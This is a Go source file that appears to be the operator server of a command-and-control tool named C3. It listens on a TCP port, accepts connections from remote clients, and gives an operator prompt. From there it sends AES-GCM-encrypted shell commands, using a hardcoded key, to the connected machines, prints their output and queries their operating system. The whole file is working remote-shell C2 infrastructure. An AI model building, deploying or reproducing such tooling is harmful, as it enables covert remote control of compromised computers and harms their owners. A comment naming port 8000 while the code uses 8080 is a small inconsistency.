package main

import (
	// Standard
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/gob"
	"fmt"
	"io"
	"net"
	"os"
	"strings"

	// C3
	"github.com/calebmatsick/C3/pkg/color"
)


func encrypt(input string) []byte {
	mes := []byte(input)
	key := []byte("passphrasewhichneedstobe32bytes!")

	c, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)

	if err != nil {
		fmt.Println(err)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	mes = gcm.Seal(nonce, nonce, mes, nil)

	return mes
}


func shell(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	shellLoop:for {
		fmt.Printf(color.Green + "[shell]: " + color.Reset)
		shellCmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		shellCmd = strings.TrimSuffix(shellCmd, "\n") 

		switch {
		case shellCmd == "":
			continue
		case shellCmd == "close":
			encShellCmd := encrypt(shellCmd)
			enc.Encode(encShellCmd)
			break shellLoop
		case shellCmd == "exit":
			exit(conn)
			break shellLoop
		default:
			result := ""
			encShellCmd := encrypt(shellCmd)
			enc.Encode(encShellCmd)
			dec.Decode(&result)
			result = strings.TrimSuffix(result, "\n")
			fmt.Println(string(result))
		}
	}
}


func sysinfo(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	enc.Encode(encrypt("sysinfo"))

	result := ""
	dec.Decode(&result)

	switch {
	case result == "windows":
		fmt.Println("The system is running Windows")
	case result == "darwin":
		fmt.Println("The system is running MacOS")
	case result == "linux":
		fmt.Println("The system is running Linux")	
	}
}


func exit(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	enc.Encode(encrypt("exit"))
	conn.Close()
}


func handleConnection(conn net.Conn) {
	connLoop:for {
		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
		c3cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		c3cmd = strings.TrimSuffix(c3cmd, "\n")

		switch {
		case c3cmd == "":
			continue connLoop
		case c3cmd == "exit":
			exit(conn)
			break connLoop
		case c3cmd == "shell":
			shell(conn)
		case c3cmd == "sysinfo":
			sysinfo(conn)
		default:
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
		}
	}

}


func main() {
	fmt.Println("Start server")

	// Listen on port 8000
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot listen on given port")
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot accept connection")
		}
		go handleConnection(conn)
	}
}